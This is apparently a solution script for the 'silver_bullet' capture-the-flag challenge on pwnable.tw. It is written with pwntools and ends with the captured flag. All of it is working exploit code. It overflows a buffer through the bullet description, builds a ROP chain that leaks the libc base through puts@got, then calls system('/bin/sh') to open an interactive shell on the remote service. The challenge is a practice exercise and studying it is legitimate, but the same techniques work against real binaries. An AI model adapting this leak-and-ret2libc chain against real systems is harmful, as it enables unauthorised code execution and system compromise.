from pwn import *

elf = ELF("silver_bullet")
libc = ELF('libc_32.so.6')

p = remote("chall.pwnable.tw", 10103)


def menu(option):
    p.sendlineafter(b'choice :', str(option).encode())


def new(description):
    menu(1)
    p.sendafter(b'description of bullet :', description)
    p.recvline()


def powerup(description):
    menu(2)
    p.sendafter(b'another description of bullet :', description)
    p.recvline()


def beat():
    menu(3)
    p.recvuntil(b'Oh ! You win !!\n')


def beat_and_rop(*chain):
    n = 4 * len(chain)
    assert n < 48

    new(b'A' * n)
    powerup(b'U' * (48 - n))
    powerup(b'\xff' * 7 + b''.join(map(p32, chain)))

    beat()


MAIN = 0x08048954
PRINTF = 0x08048494
POP_POP_RET = 0x08048a7a  # 0x08048a7a : pop edi ; pop ebp ; ret

with log.progress('Stage 1: Leaking libc base address') as l:
    l.status('Beating warewolf and leaking puts@got')
    beat_and_rop(PRINTF,
                 POP_POP_RET,
                 elf.got['puts'],
                 0xdeadbeef,
                 MAIN,
                 0xdeadbeef,
                 0xdeadbeef)

    leak = u32(p.recv(4))
    libc_base = leak - libc.symbols['puts']
    l.success(hex(libc_base))

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

with log.progress('Stage 2: Executing system(/bin/sh)') as l:
    l.status('Beating warewolf and loading ropchain')
    beat_and_rop(system, 0xdeadbeef, binsh, 0xdeadbeef, binsh)
    p.sendline(b'/bin/sh')
    l.success()
    p.interactive()

# FLAG --> FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
